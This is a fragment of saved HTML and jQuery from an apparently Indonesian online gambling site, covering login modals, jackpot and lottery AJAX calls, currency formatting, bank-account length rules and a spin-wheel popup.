          $( "#sideNav" ).removeClass( "navContentOpen" );
          $( "#sideNav" ).removeClass( "open" );
          $( "#mainContent" ).removeClass( "navContentOpen" );
          $( "#mainContent" ).removeClass( "sideNavOpen" );
          $( "#mainContent" ).removeClass( "rightSideBarOpen" );
          $( "#r-side-bar" ).removeClass( "open" );
        });

        //this is mobile version of btn close login modal
         $(document).on('click', '#btn-close--login-modal',function(event){
              event.preventDefault();
              event.stopPropagation();
              $('#r-side-bar').removeClass('open');
              $( "#mainContent" ).removeClass( "rightSideBarOpen" );
              return false;

        });

        $(document).on('click','.btn-collapse-balances', function(){
          if( !$('#other-game-bals').is(':visible')){
            $('#other-game-bals').slideDown();
            window.getAllGameBal();
          }
          else{
            $('#other-game-bals').slideUp();
          }
          return false;
        });
      });

  </script>

  <script>
    

    
   
    window.loadOrRefreshTurnstileWidget= function(  selectorId ){

         //do nothing;
    }
     
</script>
    <script type="text/javascript" src="/assets/js/jquery-validation/jquery.validate.min.js"></script>
    <script type="text/javascript" src="/assets/js/jquery-validation/additional-methods.min.js"></script>
    <link rel="stylesheet" href="/assets/js/fancybox/jquery.fancybox.min.css">


    <script type="text/javascript" src="/assets/js/fancybox/jquery.fancybox.min.js"></script>
<script>
 
        window.isAuth=  true  ? true : false;
        window.onLogOut = async function(){
            if(window.iFirebase){
                await window.iFirebase.logout();
            }
            
            window.location.href="https://www.Goblin88.site/logout.php";

        }
        window.fbs =  {"apiKey":"AIzaSyA6hCmsU1Tx-_rB9st6TiXLT_M3D-qQ9aw","authDomain":"api-kixplay-live1.firebaseapp.com","projectId":"api-kixplay-live1","storageBucket":"api-kixplay-live1.firebasestorage.app","messagingSenderId":"892534263551","appId":"1:892534263551:web:8c9f262c8a457b082146ca","measurementId":null} ;
        window.firebasSuccessCb = function (params){
        window.json_post(
                "/authViaIdp",
                params ,
                "json",
                showLoadingImgFn   ,
                 removeLoadingImgFn    ,
            ).done(function(d){
    
             window.onLoginCallback(d,true);

            });
        }
    

         window.currencyCode='IDR';
         window.lang="id";
         window.agentCode='MERCUSUAR77';
         window.sweetAlert= function ( msg , type , title  ,showCancelBtn   ) {
            //check CF error
            var dateNow = "2026-02-25 08:25:39";

            if (msg.indexOf('cloudflare') >= 0) {
                msg = transMsgs.cfTimeout + ' (error time: ' + dateNow + ')';
                title = " ";
            }
            if (msg.indexOf('challenge') >= 0) {
                msg = transMsgs.cfChallenge + ' (error time: ' + dateNow + ')';
                title = " ";
            }
             return     Swal.fire({
                    title: !title? "Warning" : title,
                    text: msg,
                    icon: !type? "error":type,
                    showCancelButton :(showCancelBtn ? true:false),
                    cancelButtonText : "Cancel",
                    showConfirmButton : true, 
                    confirmButtonText : 'OK', 
                } );
            }
            console.log('window.name ' + window.name );
            window.name = !window.name? "parent"  + Date.now() + Math.floor(Math.random() * 100000000) : window.name;
            console.log('window.name ' + window.name );
           window.formatNumber = function (n)   {
                // format number 1000000 to 1,234,567
                return n.replace(/[^0-9\-]/g, "").replace(/\B(?=(\d{3})+(?!\d))/g, ",")
            }
            window.convertToNumber= function (value) {

                    if (!value) {
                        return 0;
                    }
                    if(value.indexOf(".") >= 0){
                        var decimal_pos = value.indexOf(".");
                        value= value.substring(0, decimal_pos);

                    }
                    var number =value.replace(/[^0-9.-]+/g, "");
                    if (isNaN(number)) {
                        number = 0;
                    }
                return number;
           }

            window.formatCurrency = function (value) {
                    const symbol = "";//"$"
                    // get input value
                    var input_val = value;

                    if (typeof value !== 'string') {
                        var input_val = value.toString();
                    }
                    if (input_val === "") { return; }

                    var original_len = input_val.length;


                    if (input_val.indexOf(".") >= 0) {

                        var decimal_pos = input_val.indexOf(".");
                        var left_side = input_val.substring(0, decimal_pos);
                        var right_side = input_val.substring(decimal_pos+1);

                        left_side = formatNumber(left_side);

                        right_side += "00";

                        right_side = right_side.substring(0, 2);

                        input_val = symbol + left_side + "." + right_side;

                    } else {
                        input_val = formatNumber(input_val);
                        input_val = symbol + input_val + ".00";;

                    }

                    return input_val;
           }

                window.prize = 0 ;
                window.ajax_jackpot= function  () {
                    $.ajax({
                        url: "https://merdekaMERCUSUAR77.site/getPokerJackpotAmt",
                        type: 'post',
                        data: { _token : $('meta[name=csrf-token]').attr('content') },
                        success: function (data) {
                            prize = (data / 2000.000)*2000.000;
                            $('.jackpot_numbers_home').html(`IDR <span id="jackpot_amount">${ commaSeparateNumber(prize) }</span>`)

                            //$('.jackpot_numbers_home').html(`IDR ` + commaSeparateNumber(data.prize));
                        }
                    });
                }
                window.getHkbLotteryResults= function  (callback) {
                    var results = [];
                    $.ajax({
                        url: "https://merdekaMERCUSUAR77.site/getHKBLotteryResults",
                        type: 'post',
                        data: { _token : $('meta[name=csrf-token]').attr('content') },
                        success: function (result) {
                            results =  result.data.hkb_lottery_results;
                            if (typeof callback === 'function') {
                                callback(results);
                            }
                        }
                    });
                   
                }

                var newI = 0;
                window.popitup = function  (url,gameid) {
                  //alert(gameid);
                    newwindow = window.open(url,  window.agentCode + '_gameWindow'+gameid+newI,'toolbar=0,width=1200,height=750');
                    newI++;
                    if (window.focus) { newwindow.focus() }
                    return false;
                }

                window.popup = function (mylink, windowname) {
                    if (!window.focus) return true;
                    var href;
                    if (typeof (mylink) == 'string')
                        href = mylink;
                    else
                        href = mylink.href;
                    window.open(href, windowname, 'width=600,height=800,scrollbars=yes');
                    return false;
                }
                window.commaSeparateNumber = function (val, isJP) {
                    while (/(\d+)(\d{3})/.test(val.toString())) {

                        if( window.currencyCode=='VND' && isJP){
                            val = val.toFixed(0);
                        }else {
                            val = Number(val).toFixed(2);
                        }
                        val = val.toString().replace(/(\d)(?=(\d\d\d)+(?!\d))/g, "$1,");
                    }
                    return val;
                }

                window.getRandomIntInclusive =  function (min, max) {
                    min = Math.ceil(min);
                    max = Math.floor(max);
                    return Math.floor(Math.random() * (max - min + 1)) + min; //The maximum is inclusive and the minimum is inclusive
                }

                /*bank acc min and maxlength limitation */
                window.accLength = parseInt("8");
                    window.bankAccLength =function(selectedBank, default_minlength, default_maxlength){
                        console.log(selectedBank, default_minlength, default_maxlength);
                        var   custom_minLength, custom_maxLength;
                if(selectedBank == 'MDR' || selectedBank == 'MDRLV'){
                    custom_minLength = 13;
                    custom_maxLength = 13;
                }
                else if(selectedBank == 'BNI' || selectedBank == 'BCA' || selectedBank == 'BSI' || selectedBank == 'BLA'){
                    custom_minLength = 10;
                    custom_maxLength = 10;
                } 
                else if(selectedBank == 'BRI'){
                    custom_minLength = 15;
                    custom_maxLength = 15;
                } 
                else if(selectedBank == 'DMN'){
                    custom_minLength = 10;
                    custom_maxLength = 12;
                } 
                else if(selectedBank == 'BPDSULTENG'){
                    custom_minLength = 10;
                    custom_maxLength = 15;
                }
                else if(selectedBank == 'ALADIN' || selectedBank == 'ALLO'){
                    custom_minLength = 10;
                    custom_maxLength = 13;
                } 
                else if(selectedBank == 'JAGO' || selectedBank == 'ARIN'){
                    custom_minLength = 8;
                    custom_maxLength = 12;
                } 
                else if(selectedBank == 'CIMBN' || selectedBank == 'SEABANK'){
                    custom_minLength = 12;
                    custom_maxLength = 12;
                }  
                else{
                    custom_minLength  = default_minlength;
                    custom_maxLength  = default_maxlength; 
                }   
                
                return {'min_len': custom_minLength,'max_len': custom_maxLength}
                    }
                /*bank acc min and maxlength limitation end*/ 


  $(document).ready(function () {
                    //suspend-alert
                   // login-alert
                   // promo-disabled-alert
                   // "maintenance-alert";
                   // "comingsoon-alert";
                window.alertLogin=function(e){
                    e.preventDefault();
                    sweetAlert( transMsgs.plsLogin  );
                    return false;
                }

                $(".suspend-alert").click(function (e) {
                        e.preventDefault();
                        sweetAlert( transMsgs.blockedFrGame);
                        return false;
                });

                $(".login-alert").click(function (e) {
                    if($("#login-modal--layout").length && !$('#loginForm').hasClass('js-inline-form') ){
                         $("#login-modal--layout").nifty("show")
                    }
                    else {
                        alertLogin(e);
                    }

                    return false;
                });

                $(".maintenance-alert").click(function (e) {
                        e.preventDefault();
                        sweetAlert( transMsgs.gameMaintenance);
                        return false;
                });

                $(".comingsoon-alert").click(function (e) {
                        e.preventDefault();
                        sweetAlert( transMsgs.gameComingSoon);
                        return false;
                });

                $(".promo-disabled-alert").click(function (e) {
                        e.preventDefault();
                        sweetAlert(transMsgs.gamePromoBlock);
                        return false;
                });


               
                $("#login-modal--layout").on('shown.nifty.modal', function(){
                    window.loadOrRefreshTurnstileWidget('loginTurnstileWidget' ); 
                });
 
        });


        $("input").focus(function() {
          $("body").addClass("input-focused");
        });
        $("input").focusout(function() {
          $("body").removeClass("input-focused");
        });

        // popup banner
        var isLoggedIn = window.isAuth;
        var isClosedPopUp = isLoggedIn ? sessionStorage.getItem('isClosedPopUpAftLogin') : sessionStorage.getItem('isClosedPopUp');
        
        if(!isClosedPopUp){
                    }
</script>


<script defer="" type="text/javascript" src="/assets/js/firebase10d9.js"> </script>


 
  <div class="reward-program-popup"></div>
<div class="claimed-reward-popup"></div>
<div class="redeem-ticket-popup"></div>

<!-- spin-wheel modal -->
<div class="modal-wrapper nifty-modal fade-in-scale" id="spin-wheel-modal--layout" data-isnotcloseoverlay="true">
	<div class="md-content"> 
		<div class="md-body"> 
		<div class="modal-header text-center headerModal">
			<button class="btn btn-link closeBtn" id="btn-close--spin-wheel-modal"> X </button>
			</div>
			<div class="flex spinWheelWrapper text-center">
            <!-- spin-wheel type -->
            <input type="hidden" id="spin_wheel_type" value="">

              <div class="spinWheelTitle">Spin Wheel</div>
              <div>untuk mendapatkan koin atau lainnya</div>
              
              <div class="spinWheel">
                <div class=" inline-flex" style="position: relative;">
                  <canvas id="wheelCanvas" width="280" height="280"></canvas>
                  <div class="spinWheelArrow"></div>
                </div>
              </div>
            </div>
			<div class="flex" style=" place-content: center; ">
                <button class="btn btn-block btn-primary " id="spinBtn">
				 Coba Keberuntungan Anda                </button>
            </div>
        </div>
	</div>
</div>
<div class="md-overlay"></div>
<!-- end of spin-wheel modal -->
  <script type="text/javascript" src="/assets/js/ugsports/app_mobile.js"> </script>
  <!--License TNC Modal -->
<!--License TNC Modal -->

<!--Language Option Modal -->
<div class="nifty-modal slide-in-bottom " id="langModal-mobile">
  <div class="md-content">
    <div class="md-body">
      <div class="wrap language">
        <div class="title">Wilayah dan bahasa</div>
        <table class="table-borderless"> 
        
          <tbody><tr>
            <td class="country">Indonesia</td>
            <td></td>
            <td></td>
          </tr>
          <tr>
            <td class="flag-wrap">
              <div class="circle-id"></div>
            </td>
                        <td class="i  ">
            <a href="#" onclick="changeLang(&quot;id&quot;)"> indonesian</a>
            </td>

                        <td class="i b-line ">
            <a href="#" onclick="changeLang(&quot;en&quot;)"> English</a>
            </td>

                        <td class="i b-line ">
            <a href="#" onclick="changeLang(&quot;cn&quot;)"> Mandarin</a>
            </td>

                      </tr> 
     
        </tbody></table>
      </div>
    </div>
  </div>
</div>
<div class="md-overlay"></div>
<!--END Language Option Modal -->
 
<script>
$(document).ready(function () {
  });
 function changeLang(key){
      change_lang(key)
  }
  $('.btn-refresh-captcha').on( 'click', function(e){
e.preventDefault();
e.stopPropagation(); 
var $captchaImg = $(this).parent().find('img');
var curCapUrl = $captchaImg .attr("data-url");
var url = curCapUrl + Date.now() + Math.floor(Math.random() * 100000000);
$captchaImg.attr("src",url);

});



</script>





  

  <script type="text/javascript">
    $(document).ready(function(){
      if( window.location.href.indexOf('reLogin=yes') >= 0  &&  !window.isAuth){
        $("#btnToggleRSideNav").trigger('click');
      }
    });
  </script>

  <script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;733979b9c24043199561a4eac8bf2940&quot;,&quot;r&quot;:1,&quot;server_timing&quot;:{&quot;name&quot;:{&quot;cfCacheStatus&quot;:true,&quot;cfEdge&quot;:true,&quot;cfExtPri&quot;:true,&quot;cfL4&quot;:true,&quot;cfOrigin&quot;:true,&quot;cfSpeedBrain&quot;:true},&quot;location_startswith&quot;:null}}" crossorigin="anonymous"></script>




<veepn-lock-screen><style>@font-face{font-family:FigtreeVF;src:url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2 supports variations"),url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2-variations");font-weight:100 1000;font-display:swap}</style></veepn-lock-screen><iframe ng-non-bindable="" frameborder="0" hspace="0" marginheight="0" marginwidth="0" scrolling="no" tabindex="-1" vspace="0" width="100%" aria-hidden="true" id="I0_1771979141472" name="I0_1771979141472" src="https://api-kixplay-live1.firebaseapp.com/__/auth/iframe?apiKey=AIzaSyA6hCmsU1Tx-_rB9st6TiXLT_M3D-qQ9aw&amp;appName=%5BDEFAULT%5D&amp;v=11.3.0&amp;eid=p&amp;usegapi=1&amp;jsh=m%3B%2F_%2Fscs%2Fabc-static%2F_%2Fjs%2Fk%3Dgapi.lb.id.8ECc3i-niIA.O%2Fd%3D1%2Frs%3DAHpOoo8g466w4vfctJFQ7iHLN0dzTSqREg%2Fm%3D__features__#id=I0_1771979141472&amp;_gfid=I0_1771979141472&amp;parent=https%3A%2F%2FmerdekaMERCUSUAR77.site&amp;pfname=&amp;rpctoken=39952833" style="position: absolute; top: -100px; width: 1px; height: 1px;"></iframe></body></html>